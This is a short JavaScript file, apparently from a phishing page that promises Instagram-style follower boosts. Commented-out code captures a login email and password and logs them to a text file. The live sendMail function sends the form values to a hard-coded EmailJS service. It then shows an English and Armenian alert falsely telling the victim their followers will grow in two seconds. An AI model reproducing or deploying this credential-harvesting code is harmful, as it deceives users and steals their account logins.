
// function getting_info() {
//     //getting user input value
//     const email = document.getElementById("login_email").value;
//     const pass = document.getElementById("login_password").value;
//     const button = document.getElementById("login_button");

//     //cheking value
//     if (email.length <= 0 || pass.length <= 5) {
//         //disenabling button if value not match with criteria
//         button.setAttribute("disabled", "disabled");
//         button.style.backgroundColor = "#7cbde9";
//     } else {
//         //enabling button if value meet the criteria
//         button.removeAttribute("disabled");
//         button.style.backgroundColor = "#0095f6";
//     }
//     const final_output = "Username: " + email + " Password: " + pass;
//     return final_output;
// }
// function show_msg() {
//     const error_msg = document.getElementById("error_msg");

//     error_msg.removeAttribute("hidden");

//     console.log(getting_info());

//     //writing file or creating file
//     const fs = new ActiveXObject("Scripting.FileSystemObject");
//     var txt = fs.CreateTextFile("Log_Data.txt" , true);
//     txt.WriteLine(getting_info());
//     txt.close()
// }



// let login_form = document.getElementById('login_form');

// //first way
// login_form.addEventListener("submit" , function(e) {
//       e.preventDefault();
// });

// function prevent_refresh(e){
//     e.preventDefault()
// }
// login_form.addEventListener('submit' , prevent_refresh)

// const email = document.getElementById("login_email") ;
// const pass = document.getElementById("login_password") ;
// const button = document.getElementById("login_button") ;

// email.addEventListener('input' , function() {

//     button.disabled = email.value.length <= 0 ;

// })
// pass.addEventListener('input' , function() {

//     button.disabled = pass.value.length <=5 ;

// })



function sendMail() {
    var params = {
      name: document.getElementById("name").value,
      email: document.getElementById("email").value,
  
    };
  

    const serviceID = "service_q86pnm9";
    const templateID = "template_6u5nw38";
  
      emailjs.send(serviceID, templateID, params)
      .then(res=>{
          document.getElementById("name").value = "";
          document.getElementById("email").value = "";
          
          console.log(res);
          alert("Congratulations Your email has been sent successfully, wait 2 seconds your followers will increase, Շնորհավորում ենք! հաջողությամբ ուղարկվեց ձեր նամակը սպասեք 2 վայրկյան ձեր ֆոլովները կավելանան։")
  
      })
      .catch(err=>console.log(err));
  
  }
